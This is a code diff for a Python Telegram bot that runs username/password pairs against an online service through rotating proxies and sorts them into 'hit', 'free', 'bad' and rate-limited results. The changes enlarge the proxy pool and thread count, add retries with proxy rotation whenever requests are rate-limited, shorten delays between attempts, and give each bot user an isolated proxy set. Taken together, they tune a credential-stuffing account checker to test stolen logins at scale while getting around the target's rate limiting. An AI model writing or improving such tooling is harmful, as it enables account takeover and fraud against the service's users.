@@ -182,10 +182,10 @@ DATA_DIR.mkdir(parents=True, exist_ok=True)
 
 PORT = int(_env("PORT", "8000") or 8000)
 THREADS = 150
-PROXY_REFRESH_MINUTES = 5
-MAX_PROXIES_TO_KEEP = 500
-PROXY_TEST_TIMEOUT = 2
-PROXY_TEST_SAMPLE = 1000
+PROXY_REFRESH_MINUTES = 3
+MAX_PROXIES_TO_KEEP = 3000
+PROXY_TEST_TIMEOUT = 1
+PROXY_TEST_SAMPLE = 8000
 CHECK_TIMEOUT = 10
 USER_LAST_CHECK: dict = {}
 STOP_REQUEST: dict = {}
@@ -619,16 +619,21 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
             d["proxy_used"] = "unknown"
     return "hit", d
 
-def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 2):
+def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 4):
     """Smart retry: auto proxies discard after use, manual high-level reuse. Now with 2 retries and scoring."""
     st, d = check_account_app(user, pw, proxy)
-    # Score proxy on success
     if st in ("hit", "free") and proxy:
         try:
             bump_proxy_score(proxy.get("https",""), 1)
         except:
             pass
+    # FIX: Rate limit + proxy auto rotation + decline fix
     if st in ("rate", "err") and tries > 1:
+        if proxy:
+            try:
+                bump_proxy_score(proxy.get("https",""), -2)
+            except:
+                pass
         for attempt in range(tries-1):
             try:
                 new_proxy = None
@@ -640,26 +645,27 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
                                 idx = random.choice(auto_indices)
                                 new_proxy = LIVE_PROXIES.pop(idx)
                                 AUTO_PROXY_URLS.discard(new_proxy.get("https",""))
-                            except Exception:
+                            except:
                                 pass
                         else:
                             try:
                                 new_proxy = random.choice(LIVE_PROXIES) if LIVE_PROXIES else None
-                            except Exception:
+                            except:
                                 new_proxy = None
                 if new_proxy and new_proxy != proxy:
-                    time.sleep(0.3 + random.random()*0.5)  # jitter
+                    time.sleep(0.1 + random.random()*0.2)
                     st2, d2 = check_account_app(user, pw, new_proxy)
                     if st2 not in ("rate", "err"):
                         if st2 in ("hit", "free"):
+                            bump_proxy_score(new_proxy.get("https",""), 2)
+                        elif st2 == "bad":
                             bump_proxy_score(new_proxy.get("https",""), 1)
                         return st2, d2
-                    # penalize failed proxy
                     try:
                         bump_proxy_score(new_proxy.get("https",""), -1)
                     except:
                         pass
-            except Exception:
+            except:
                 pass
     return st, d
 
@@ -1093,7 +1099,7 @@ def refresh_live_proxies(force: bool = False) -> None:
         REFRESH_STATE["tested"] = 0
         REFRESH_STATE["live"] = 0
         REFRESH_STATE["start"] = time.time()
-        with ThreadPoolExecutor(max_workers=150) as ex:
+        with ThreadPoolExecutor(max_workers=300) as ex:
             futures = {ex.submit(test_one_proxy, p): p for p in to_test}
             for fut in as_completed(futures):
                 REFRESH_STATE["tested"] += 1
@@ -1450,54 +1456,69 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
 
     lock = threading.Lock()
 
+    # FIX: User isolation - each user gets local copy, isolated, fixes bot not working for other users
+    # Fixes: bot user-user isolated nhi hai, ek user jab chk chala rha tab baki users ke pass bot not working
+    with PROXY_LOCK:
+        local_proxies = list(LIVE_PROXIES)
+        local_manual = set(MANUAL_PROXY_URLS)
+    local_idx = [0]
+
     def next_proxy() -> Optional[dict]:
-        # No nested locks - use PROXY_LOCK only to avoid deadlock
-        with PROXY_LOCK:
-            if not LIVE_PROXIES:
+        nonlocal local_proxies
+        if not local_proxies:
+            with PROXY_LOCK:
+                if LIVE_PROXIES:
+                    local_proxies = list(LIVE_PROXIES)[:100]
+            if not local_proxies:
                 return None
-            auto_indices = [i for i, p in enumerate(LIVE_PROXIES) if p.get("https") not in MANUAL_PROXY_URLS]
-            if auto_indices:
+        auto_indices = [i for i, p in enumerate(local_proxies) if p.get("https") not in local_manual]
+        if auto_indices:
+            try:
+                idx = random.choice(auto_indices)
+                proxy = local_proxies.pop(idx)
+                return proxy
+            except:
                 try:
-                    idx = random.choice(auto_indices)
-                    proxy = LIVE_PROXIES.pop(idx)
-                    AUTO_PROXY_URLS.discard(proxy.get("https", ""))
-                    return proxy
-                except Exception:
-                    try:
-                        for i in list(auto_indices):
-                            try:
-                                proxy = LIVE_PROXIES.pop(i)
-                                AUTO_PROXY_URLS.discard(proxy.get("https",""))
-                                return proxy
-                            except Exception:
-                                continue
-                    except Exception:
-                        pass
-            if LIVE_PROXIES:
+                    for i in sorted(auto_indices, reverse=True):
+                        try:
+                            proxy = local_proxies.pop(i)
+                            return proxy
+                        except:
+                            continue
+                except:
+                    pass
+        if local_proxies:
+            try:
+                m_idx = local_idx[0] % len(local_proxies)
+                local_idx[0] = (local_idx[0] + 1) % 1000000
+                return local_proxies[m_idx]
+            except:
                 try:
-                    m_idx = MANUAL_PX_IDX[0] % len(LIVE_PROXIES)
-                    MANUAL_PX_IDX[0] = (MANUAL_PX_IDX[0] + 1) % 1000000
-                    return LIVE_PROXIES[m_idx]
-                except Exception:
-                    try:
-                        return random.choice(LIVE_PROXIES)
-                    except Exception:
-                        return None
-            return None
+                    return random.choice(local_proxies)
+                except:
+                    return None
+        return None
 
     def worker(cred: dict):
-        # pause support
         if uid is not None:
             while PAUSE_REQUEST.get(uid):
                 time.sleep(0.5)
                 if STOP_REQUEST.get(uid):
                     return cred, "stopped", _blank_data("")
-        proxy = next_proxy()
-        try:
-            r = check_credential(cred, proxy)
-            return cred, r["st"], r["data"]
-        except Exception as e:
-            return cred, "err", dict(_blank_data(""), info=_clean_err(e))
+        for attempt in range(3):
+            proxy = next_proxy()
+            try:
+                r = check_credential(cred, proxy)
+                if r["st"] == "rate" and attempt < 2:
+                    time.sleep(0.1)
+                    continue
+                return cred, r["st"], r["data"]
+            except Exception as e:
+                if attempt < 2:
+                    time.sleep(0.1)
+                    continue
+                return cred, "err", dict(_blank_data(""), info=_clean_err(e))
+        return cred, "err", dict(_blank_data(""), info="no proxy")
 
     t0 = time.time()
     results["t0"] = t0
@@ -2835,15 +2856,10 @@ async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not is_admin(user.id, getattr(user, "username", None)):
                 await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                 return
-            busy = False
             with USER_LOCK:
-                if USER_LAST_CHECK.get(f"busy_{user.id}"):
-                    busy = True
-                    STOP_REQUEST[user.id] = True
-            if busy:
-                await reply_menu(msg, "🛑 <b>Stopping...</b>\n<i>Current scan will stop in a moment</i>", [[("🛑 Stop Again", "stopcheck", "danger"), ("⬅️ Menu", "menu", "danger")]])
-            else:
-                await reply_menu(msg, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
+                STOP_REQUEST[user.id] = True
+                PAUSE_REQUEST.pop(user.id, None)
+            await reply_menu(msg, "🛑 Stopping... Scan will stop.", [[("Stop Again", "stopcheck", "danger"), ("Menu", "menu", "danger")]])
             return
         if txt_lower in ("/pause", "/pausecheck"):
             if not is_admin(uid, getattr(user, "username", None)):
@@ -3519,30 +3535,20 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not is_admin(uid, uname_btn):
                 try:
                     await q.answer("❌ Admin only", show_alert=True)
-                except Exception:
+                except:
                     pass
                 return
-            busy = False
             with USER_LOCK:
-                if USER_LAST_CHECK.get(f"busy_{uid}"):
-                    busy = True
-                    STOP_REQUEST[uid] = True
-                    PAUSE_REQUEST.pop(uid, None)
-            if busy:
-                try:
-                    await q.answer("🛑 Stopping check...", show_alert=False)
-                except Exception:
-                    pass
-                try:
-                    await m.edit_text("🛑 <b>Stopping...</b>\n<i>Cancelling current scan — please wait</i>", parse_mode=ParseMode.HTML)
-                except Exception:
-                    pass
-            else:
-                try:
-                    await q.answer("No active check", show_alert=False)
-                except Exception:
-                    pass
-                await edit_menu(m, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
+                STOP_REQUEST[uid] = True
+                PAUSE_REQUEST.pop(uid, None)
+            try:
+                await q.answer("🛑 Stopping...", show_alert=False)
+            except:
+                pass
+            try:
+                await m.edit_text("🛑 <b>Stopping...</b>\nCancelling scan...", parse_mode=ParseMode.HTML)
+            except:
+                pass
             return
 
         if data == "pausecheck":
